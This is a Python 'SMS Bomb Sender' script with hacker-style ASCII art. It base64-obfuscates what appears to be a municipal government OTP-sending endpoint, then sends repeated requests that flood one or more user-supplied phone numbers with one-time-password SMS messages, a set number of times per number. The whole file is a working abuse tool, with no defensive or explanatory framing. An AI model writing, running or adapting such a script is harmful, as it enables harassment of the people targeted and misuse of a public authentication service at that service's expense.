import requests
import time
import base64
import keyboard
from colorama import init, Fore, Style

init(autoreset=True)

def send_otp(mobile_no):
    encoded_url = "aHR0cHM6Ly9hcHBseS5jb2xvbWJvLm1jLmdvdi5say9iYWNrZW5kL290cC9zZW5kT3Rw"
    url = base64.b64decode(encoded_url).decode()
    
    payload = {
        "mobileNo": mobile_no
    }
    headers = {
        'Content-Type': 'application/json'
    }
    
    response = requests.post(url, json=payload, headers=headers)
    return response

def loading_animation(duration):
    chars = "██▒▒"
    for _ in range(duration):
        for char in chars:
            print(f"\r{Fore.GREEN}Hacking... {char}", end="", flush=True)
            time.sleep(0.2)
            if keyboard.is_pressed('esc'):
                print(f"\n{Fore.RED}Process interrupted. Exiting...")
                return

def print_ascii_art():
    art = f"""
{Fore.RED}██╗  ██╗ █████╗ ██████╗ ██╗██╗   ██╗██╗
{Fore.RED}██║  ██║██╔══██╗██╔══██╗██║██║   ██║██║
{Fore.GREEN}███████║███████║██████╔╝██║██║   ██║██║
{Fore.GREEN}██╔══██║██╔══██║██╔══██╗██║╚██╗ ██╔╝██║
{Fore.RED}██║  ██║██║  ██║██║  ██║██║ ╚████╔╝ ██║
{Fore.RED}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═╝

{Fore.YELLOW}    Powered by Emrys...
    """
    print(art)

def main():
    print_ascii_art()

    print(f"{Fore.GREEN}Welcome to the SMS Bomb Sender!")
    
    while True:
        print(f"\n{Fore.BLUE}Choose an option:")
        print(f"1. Send SMS to a single number")
        print(f"2. Send SMS to multiple numbers")
        print(f"Esc. Exit program")
        
        option = input("Enter your choice (1, 2, or Esc): ")
        
        if option == '1':
            mobile_no = input(f"{Fore.BLUE}Enter the mobile number to send SMS: ")
            count = int(input(f"{Fore.BLUE}How many times would you like to attempt to send SMS to {mobile_no}? "))
            send_single_otp(mobile_no, count)
        elif option == '2':
            phone_numbers_input = input(f"{Fore.BLUE}Enter phone numbers separated by commas: ")
            phone_numbers = [num.strip() for num in phone_numbers_input.split(',')]
            count = int(input(f"{Fore.BLUE}How many times would you like to attempt to send SMS to each number? "))
            send_multiple_otp(phone_numbers, count)
        elif option.lower() == 'esc':
            print(f"{Fore.RED}Exiting program...")
            break
        else:
            print(f"{Fore.RED}Invalid option. Please choose 1, 2, or Esc.")

def send_single_otp(mobile_no, count):
    print(f"\n{Fore.RED}Attempting to send SMS to {mobile_no}...")
    for i in range(count):
        loading_animation(8)
        response = send_otp(mobile_no)
        if response.status_code == 200:
            print(f"\r{Fore.GREEN}SMS sent successfully to {mobile_no} (Attempt {i + 1}).")
        else:
            print(f"\r{Fore.RED}Failed to send SMS to {mobile_no} (Attempt {i + 1}). Status code: {response.status_code}")

def send_multiple_otp(phone_numbers, count):
    for mobile_no in phone_numbers:
        print(f"\n{Fore.RED}Attempting to send SMS to {mobile_no}...")
        for i in range(count):
            loading_animation(8)
            response = send_otp(mobile_no)
            if response.status_code == 200:
                print(f"\r{Fore.GREEN}SMS sent successfully to {mobile_no} (Attempt {i + 1}).")
            else:
                print(f"\r{Fore.RED}Failed to send SMS to {mobile_no} (Attempt {i + 1}). Status code: {response.status_code}")

if __name__ == "__main__":
    main()
